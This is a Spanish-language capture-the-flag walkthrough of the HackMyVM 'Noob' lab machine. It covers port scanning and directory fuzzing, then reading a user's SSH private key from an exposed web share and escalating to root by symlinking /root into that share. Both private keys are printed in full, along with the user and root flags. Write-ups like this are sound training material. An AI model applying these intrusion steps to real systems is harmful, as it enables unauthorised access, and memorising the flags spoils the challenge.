---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Noob HackMyVM (Easy- Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-08 05:56 EDT
Nmap scan report for 192.168.1.170
Host is up (0.00054s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 66:6a:8e:22:cd:dd:75:52:a6:0a:46:06:bc:df:53:0f (RSA)
|   256 c2:48:46:33:d4:fa:c0:e7:df:de:54:71:58:89:36:e8 (ECDSA)
|_  256 5e:50:90:71:08:5a:88:62:7e:81:07:c3:9a:c1:c1:c6 (ED25519)
65530/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
MAC Address: 08:00:27:8D:60:E3 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.59 seconds
```

Veremos que hay alojada una pagina web en el puerto `65530`, si entramos nos pondra escrito un `404 not found`, por lo que vamos a realizar un poco de `fuzzing`.

## Gobuster

```shell
gobuster dir -u http://<IP>:65530/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.170:65530/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 19]
/nt4share             (Status: 200) [Size: 179]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

Veremos que hay una carpeta llamada `index` y si entramos dentro veremos lo siguiente:

```
Hi, You are close!
```

Pero no nos dice mucho, vamos a ver la otra carpeta llamada `nt4share`, si entramos dentro veremos esto:

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Por lo que vemos esta compartiendo la carpeta de una `home` de algun usuario, por lo que vemos hay un `.ssh/` en la que podremos leer la `id_rsa`.

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAvGXqXURDOKLvimFw7BT0/Wc0BRenW0lri6TehxUjTKw3FgUb2adL
ACCvDSDCmJkFzqlk6IhC7gQZMGHj2Ea5zIgD0OG47YKA8N4mUiQK1ADTeJpJAut4dyjXvM
SdNhw9ORWqr1QcFBv9RoG9Itj8tgALOCe2yEyKSDmAs2fPGXNdLpyzSlV5BNtOxO3wB98E
Wv0PwzgOjIIe7RYTpSofdBV/Niqf6t8iS8h9YGpec9AReP9N/c0dsLhS01Ay9ZGQiJsxLh
9NS7OGhbsMARNYk0de8gWNM9hiw4Ta7cjhRgn8pR0xgOii4H7oNcj9pIWE7JM862T7p6te
tCJWqF7zWQAAA8h4t/eOeLf3jgAAAAdzc2gtcnNhAAABAQC8ZepdREM4ou+KYXDsFPT9Zz
QFF6dbSWuLpN6HFSNMrDcWBRvZp0sAIK8NIMKYmQXOqWToiELuBBkwYePYRrnMiAPQ4bjt
goDw3iZSJArUANN4mkkC63h3KNe8xJ02HD05FaqvVBwUG/1Ggb0i2Py2AAs4J7bITIpIOY
CzZ88Zc10unLNKVXkE207E7fAH3wRa/Q/DOA6Mgh7tFhOlKh90FX82Kp/q3yJLyH1gal5z
0BF4/039zR2wuFLTUDL1kZCImzEuH01Ls4aFuwwBE1iTR17yBY0z2GLDhNrtyOFGCfylHT
GA6KLgfug1yP2khYTskzzrZPunq160IlaoXvNZAAAAAwEAAQAAAQEAhYdujuA9DL1fLiNW
F93armghVKKpOWhWU0ltdyyiMku1V2QTkzahT9vadmGLywBaP1mMbct2NKCvAb2/8aBfO/
oDSl9R5PUkUpQBcSKekhhrygUATpN6dGp8TgzEqH9nXThgG5hvtkkIQJrf5P0KUCzDxu9O
+7RUJlCrSX0AKjaCvN50kicRGts/uFYekJzetgIdtlQbeoK0BTgJxpDQ0xYFOODeRnzI92
GQ+uTa8zdNbggFvgDNPDl9W1mX73uHxXttdoTj9mS/yA1KBlXmP9VIi+73xlhWbk5Iy+Xi
jWbjwq12J9xnApUXu496u/5yP55xlspn7cGV9aoO7aOhKQAAAIEAkvk/7XY0xTfnyTDsg6
6/gGiJik0oyhmx0ZlxrWGdqtiWgwjhq6Q4WMaJUU8AhBrm7lKCs7ykYt9oyBpJZ4TnHn+Q
gl0O8Wu/fhEZcj2+d7aKlWVDtUxWtAZZRDXGtfZkVTmJ5prQXFL2bMIyVsMB1M7dHTD3wk
p4nFFhoCZ2CO0AAACBAPXq+8D1p3MApxtMDJ40trMTQ3HLWLXlVTuideUj5FnHDwF73gza
p3h6LXxH+yIHw/xzg0rKoV2ikfqQBU3wqunpLw5udzPLHm+PyTHH3WsjcieB99sFAvWc9g
ni/otpQQqRgB0I3rGMqiBCKyvb1sXF12SQ0lC4N7T5hRm9/m9PAAAAgQDEHzyLduguz77R
c1CLNFjPRlTnsi1xSP9Iz2SFl1vMd2J77RRrQNURtLZZcGgmO7CL/fhTobau7neBq4+oVX
Izf0B4UUNnzL6iB0yn/tt+rBLw6ItVUj+rQmtI3i2aPVXDle1Xi5Fckm2QS343ThUq2lI9
7mtNUcmCNL6cczsI1wAAAAphZGVsYUBub29iAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
```

Para saber el nombre de usuario vamos al siguiente archivo llamado `authorized_keys` y veremos lo siguiente:

```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8ZepdREM4ou+KYXDsFPT9ZzQFF6dbSWuLpN6HFSNMrDcWBRvZp0sAIK8NIMKYmQXOqWToiELuBBkwYePYRrnMiAPQ4bjtgoDw3iZSJArUANN4mkkC63h3KNe8xJ02HD05FaqvVBwUG/1Ggb0i2Py2AAs4J7bITIpIOYCzZ88Zc10unLNKVXkE207E7fAH3wRa/Q/DOA6Mgh7tFhOlKh90FX82Kp/q3yJLyH1gal5z0BF4/039zR2wuFLTUDL1kZCImzEuH01Ls4aFuwwBE1iTR17yBY0z2GLDhNrtyOFGCfylHTGA6KLgfug1yP2khYTskzzrZPunq160IlaoXvNZ adela@noob
```

Vemos que es del usuario `adela` por lo que vamos a crear un archivo llamado `id_rsa` en nuestro `host`:

> id\_rsa

```
<ID_RSA>
```

Ahora le pondremos los permisos adecuados.

```shell
chmod 600 id_rsa
```

Nos conectaremos mediante la clave `PEM` de la siguiente forma:

```shell
ssh -i id_rsa adela@<IP>
```

Info:

```
The authenticity of host '192.168.1.170 (192.168.1.170)' can't be established.
ED25519 key fingerprint is SHA256:0ug88klEB+Auk3kP/jhWOHJJZmKXY2RjjR4GnhZdYuQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.1.170' (ED25519) to the list of known hosts.
Linux noob 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jul 14 02:50:51 2021 from 192.168.1.51
adela@noob:~$ whoami
adela
```

Y con esto ya estaremos dentro con dicho usuario.

## Escalate Privileges

Como vemos que se esta compartiendo la carpeta del usuario `adela` vamos a probar a crear un `enlace simbolico` hacia la carpeta de `root` por si el usuario que esta ejecutando la aplicacion donde se esta compartiendo la carpeta de dicho usuario fuera con privilegios elevados.

```shell
ln -s /root root_directory
```

Info:

```
lrwxrwxrwx 1 adela adela    5 Apr  8 06:19 root_directory -> /root
```

Ahora vamos a meternos en la pagina y veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Vemos que se esta viendo de forma correcta, ahora vamos a probar a meternos:

<figure><img src="../../.gitbook/assets/image (341).png" alt=""><figcaption></figcaption></figure>

Con esto veremos que funciono, si intentamos leer la `id_rsa` del usuario `root` veremos que si nos deja:

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA1FJkSwnlLljX0nI4gsTKrfOxYgc5TVEZm6Yo8Hh/GArJ5cb+ComP
nae1ebvc9evYx2F6UVVgw1H2fHc3TsiV4EtOWlIGzc2KwmKaw8YGqeBvepng5EO2+LDsxo
AFjFUwvZzxa2CvfBfdTezBv6Tixf2MilPSBdIQpGQxqnFMy6VU+17JjD93hefoL/cKsDk/
QOQDr4aNMPRHh1kIb09kRgH3RHfb5fbtq6ptc9LoRCJBBS/TigQBWQg/DcE6bPsyyqfCFy
QTwTLg9wbQZUaAGvi34GsFUxhVif8Wz2+4QKhOfJajY+4ofmx3bD/Im3MRFqvrYyVBMirg
4vcoTdyomQAAA8DLmuAwy5rgMAAAAAdzc2gtcnNhAAABAQDUUmRLCeUuWNfScjiCxMqt87
FiBzlNURmbpijweH8YCsnlxv4KiY+dp7V5u9z169jHYXpRVWDDUfZ8dzdOyJXgS05aUgbN
zYrCYprDxgap4G96meDkQ7b4sOzGgAWMVTC9nPFrYK98F91N7MG/pOLF/YyKU9IF0hCkZD
GqcUzLpVT7XsmMP3eF5+gv9wqwOT9A5AOvho0w9EeHWQhvT2RGAfdEd9vl9u2rqm1z0uhE
IkEFL9OKBAFZCD8NwTps+zLKp8IXJBPBMuD3BtBlRoAa+LfgawVTGFWJ/xbPb7hAqE58lq
Nj7ih+bHdsP8ibcxEWq+tjJUEyKuDi9yhN3KiZAAAAAwEAAQAAAQEAuc4Ahsp6DT0iYcAj
RA0DcYc5TBgWRVsbleKrIQXR8zA9zx99YatQSx9g6M9GZs+mPZVIfbTBoSwxEGsjs4ZF4q
sEPnZaDfA55jJ0Ta8WVcNay2euLxQzIx9xlaSjNlO2+7hEbTuHVolr2a2/P/8DlVB1lPgV
a5KRjctAy2+rTOoihADf4MUo+j6pT9bZ/y/HYsyWIjuPCxtwi4WCzYBJSm6C8MbvKH9gGn
xjFUGtNISgijuPUb6w17ImnEq3oiXXlOyKnxMdI5fwy6Fbj2kx0w76KBcmo/S/HWWow44P
rWh08UOq1I5re7YrmxVt5zleBU1F8qxyckw2I060dd9BoQAAAIEAkG6bRbPoQ2Vczqum2K
h9qiBis/ROHRt0J9q8YrIoZcKp0QPZ4pSXaWg+3KD75LGUMMHnbcZ0+kvZ/6HZvQDG6vr8
O1AYReMNiyCRMiRMRgM9D5WtxQL+KrTD80goez+EN6kWeY/+0kcEPOu7FTZxo7YnKuw4S0
Bjbtm5AI2vFJcAAACBAOyOSYhO3wf4W38M4QA66ESNXiCnhZ0DJBrFqcA3Cb2E8tzPFISa
4t5EbTg9aFmH/RWfMqDNcinS7zo1JBdF0ARaJhNceLQ+T8j1Gqb1+RoOe03hIjV673Vrst
uAglSAKzmI5cH4EKMnnnUcphfYHADrXN+Fha0y5O59cojS6UpHAAAAgQDlximgpc3OOI/b
zmsp5CZrkR4BGpCgci93dw+Y+xaXh6OqcQ8RO/G0g8lXjr1kZErI2Ia1MdkSBdotmPAt/K
ZxNBqOXEOeZrCUy6ujhX4HeLih7BElkYwZEKvVbJti/I0RsdcbYGWlAPPBvi/8jZnQ7xaT
T7Qx+xDGFV1hJakGHwAAAAlyb290QG5vb2I=
-----END OPENSSH PRIVATE KEY-----
```

Por lo que realizaremos el mismo proceso de antes, para conectarnos con la clave `PEM` del usuario `root`.

> id\_rsa

```
<ID_RSA_ROOT>
```

Ahora le pondremos los permisos adecuados.

```shell
chmod 600 id_rsa
```

Nos conectamos con la clave `PEM`:

```shell
ssh -i id_rsa root@<IP>
```

Info:

```
Linux noob 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jul 14 02:50:11 2021
root@noob:~# whoami
root
```

Con esto veremos que ya seremos el usuario `root`, por lo que leeremos las `flags` del usuario y de `root`.

> user.txt

```
HMVVCXUIUHFDSUIYREWDS432
```

> root.txt

```
HMVA97DSA8732HJGDSA78623
```
